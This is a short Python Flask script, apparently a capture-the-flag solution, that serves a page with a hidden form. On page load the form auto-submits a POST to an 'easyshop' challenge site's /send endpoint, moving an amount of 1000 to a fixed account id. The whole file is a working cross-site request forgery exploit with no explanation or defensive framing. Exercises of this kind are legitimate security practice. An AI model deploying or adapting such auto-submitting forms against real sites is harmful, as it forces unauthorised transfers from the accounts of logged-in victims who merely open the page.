from flask import Flask

app = Flask(__name__, static_folder='.')

@app.route('/')
def serve_html():
    return '''<!doctype html>
<html lang="en">
    <head>
        <title>ez</title>
    </head>
    <body>
        <form action="https://easyshop.challs.olicyber.it/send" method="POST">
            <input name="to" value="cee5058a38ded2c4ee1151b15eab8b0dec91d23f609f879262f9ae7306a1505a" />
            <input name="amount" value="1000" />
        </form>
        <script>
            document.getElementsByTagName("form")[0].submit();
        </script>
    </body>
</html>'''

if __name__ == '__main__':
    app.run(debug=True)